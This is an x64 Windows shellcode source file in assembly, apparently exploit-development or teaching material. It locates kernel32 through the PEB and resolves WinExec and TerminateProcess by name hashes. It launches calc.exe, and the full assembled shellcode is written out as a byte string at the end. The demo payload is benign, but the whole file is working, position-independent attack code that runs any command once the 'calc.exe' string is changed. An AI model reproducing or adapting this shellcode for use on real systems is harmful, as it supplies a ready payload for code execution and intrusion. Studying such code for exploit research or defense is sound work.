global _start

_start:
    sub rsp, 0x28                   ; space for variables

    .find_kernel32:
        xor rcx, rcx                ; TEB structure
        mov rsi, gs:[rcx + 0x60]    ; PEB structure
        mov rsi, [rsi + 0x18]       ; ntdll!PebLdr
        mov rsi, [rsi + 0x20]       ; InMemoryOrderModuleList
        mov rsi, [rsi]              ; ntdll.dll
        lodsq                       ; kernel32.dll
        mov rbx, [rax + 0x20]       ; kernel32 base

        jmp .call_winexec           ; jump to exec

    .find_function:
        mov eax, [rbx + 0x3c]       ; RVA to PE signature
        add rax, rbx                ; PE signature
        xor rcx, rcx                ; $rcx = 0x0
        mov cl, 0x88                ; Offset to Export Table
        mov r10d, [rax + rcx]       ; RVA of Export Table
        add r10, rbx                ; Export table
        mov ecx, [r10 + 0x18]       ; NR of Names
        mov edi, [r10 + 0x20]       ; RVA of Name Pointer Table
        add rdi, rbx                ; Name Pointer Table

    .find_loop:
        jrcxz .find_end             ; if rcx == 0
        dec ecx                     ; counter -= 1
        xor rsi, rsi                ; $rsi = 0x0
        push rsi                    ; 0x0
        pop rax                     ; $rax = 0x0
        cdq                         ; $rdx = 0x0
        mov esi, [rdi + rcx * 4]    ; RVA of Symbol Name
        add rsi, rbx                ; Symbol Name

    .compute_hash:
        lodsb                       ; load in al next byte from rsi
        test al, al                 ; check null terminator
        jz .compare_hash            ; if ZF == 1
        ror edx, 0x2f               ; rot 47
        add edx, eax                ; add new byte
        jmp .compute_hash           ; loop

    .compare_hash:
        cmp edx, r13d               ; cmp edx, hash
        jnz .find_loop              ; if ZF != 1
        mov r11d, [r10 + 0x24]      ; RVA of Ordinal Table
        add r11, rbx                ; Ordinal Table
        mov cx, [r11 + 2 * rcx]     ; extrapolate ordinal functions
        mov r12d, [r10 + 0x1c]      ; RVA of Address Table
        add r12, rbx                ; Address Table
        mov eax, [r12 + 4 * rcx]    ; RVA of function
        add rax, rbx                ; function

    .find_end:
        ret                         ; return

    .call_winexec:
        mov r13d, 0x10121ee3        ; WinExec() hash
        call .find_function         ; call .find_function
        cdq                         ; $rdx = 0x0
        push rdx                    ; "\x00"
        mov rcx, 0x6578652e636c6163 ; "calc.exe"
        push rcx                    ; "calc.exe\x00"
        push rsp                    ; &"calc.exe"
        pop rcx                     ; lpCmdLine
        inc rdx                     ; uCmdShow
        call rax                    ; call WinExec()

    .exit:
        mov r13d, 0x8ee05933        ; TerminateProcess() hash
        call .find_function         ; call .find_function
        push 0xffffffffffffffff     ; -1
        pop rcx                     ; hProcess
        cdq                         ; uExitCode
        call rax                    ; call TerminateProcess()

; shellcode = b"\x48\x83\xec\x28\x48\x31\xc9\x65\x48\x8b\x71\x60\x48\x8b\x76\x18\x48\x8b\x76\x20\x48\x8b\x36\x48\xad\x48\x8b\x58\x20\xeb\x59\x8b\x43\x3c\x48\x01\xd8\x48\x31\xc9\xb1\x88\x44\x8b\x14\x08\x49\x01\xda\x41\x8b\x4a\x18\x41\x8b\x7a\x20\x48\x01\xdf\xe3\x39\xff\xc9\x48\x31\xf6\x56\x58\x99\x8b\x34\x8f\x48\x01\xde\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x44\x39\xea\x75\xdf\x45\x8b\x5a\x24\x49\x01\xdb\x66\x41\x8b\x0c\x4b\x45\x8b\x62\x1c\x49\x01\xdc\x41\x8b\x04\x8c\x48\x01\xd8\xc3\x41\xbd\xe3\x1e\x12\x10\xe8\x9c\xff\xff\xff\x99\x52\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x54\x59\x48\xff\xc2\xff\xd0\x41\xbd\x33\x59\xe0\x8e\xe8\x7d\xff\xff\xff\x6a\xff\x59\x99\xff\xd0"
